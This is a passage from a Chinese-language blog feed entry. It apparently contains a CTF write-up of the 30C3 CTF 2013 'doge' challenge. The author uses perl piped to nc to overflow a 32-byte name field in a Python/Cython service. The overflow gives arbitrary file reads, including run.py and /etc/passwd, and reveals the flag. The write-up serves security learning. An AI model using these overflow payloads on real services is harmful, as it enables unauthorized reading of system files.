5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;signal&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;doge&lt;/span&gt;
&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIGCHLD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIG_IGN&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;doge&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0.0.0.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;&lt;em&gt;doge.so&lt;/em&gt; 是編譯過的 linux library&lt;br&gt;
執行起來，並且輸入長字串看看結果，結果 server 端有噴出錯誤訊息  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;...&lt;br&gt;
File "doge.pyx", line 54, in doge.Doge.__str__ (doge.c:1875)&lt;br&gt;
IOError: [Errno 2] No such file or directory: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;看來是發生 bof 了 XD&lt;br&gt;
繼續試一下前面塞多少才會蓋到，結果是 "a"x32&lt;br&gt;
&lt;code&gt;perl -e 'print "a"x32 . "test"' | nc 0 1024&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;...&lt;br&gt;
File "doge.pyx", line 54, in doge.Doge.&lt;strong&gt;str&lt;/strong&gt; (doge.c:1875)&lt;br&gt;
IOError: [Errno 2] No such file or directory: 'testi_art_doge_color.txt'  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;試試看能不能成功讀檔：
&lt;code&gt;perl -e 'print "a"x32 . "run.py\x00"' | nc 0 1024&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Dogename: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaarun.py#!/usr/bin/env python&lt;br&gt;
import signal&lt;br&gt;
import doge&lt;br&gt;
signal.signal(signal.SIGCHLD, signal.SIG_IGN)&lt;br&gt;
doge.listen("0.0.0.0", 1024)&lt;br&gt;
commands: feed, show  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下來就是猜猜看了...試了幾個檔案像是 &lt;em&gt;flag&lt;/em&gt; , &lt;em&gt;flag.txt&lt;/em&gt; , &lt;em&gt;key&lt;/em&gt; , &lt;em&gt;key.txt&lt;/em&gt; ...都失敗了 = =&lt;br&gt;
最後猜到 &lt;em&gt;/etc/passwd&lt;/em&gt;&lt;br&gt;
&lt;img alt="flag.png" src="https://ddaa.tw/images/30c3CTF_2013_doge_flag.png"&gt;&lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;30C3_51dd250e0adb864ff40cc40b818852f4&lt;/code&gt;&lt;/p&gt;</content><category term="3XC3CTF"></category><category term="Stack Overflow"></category></entry></feed>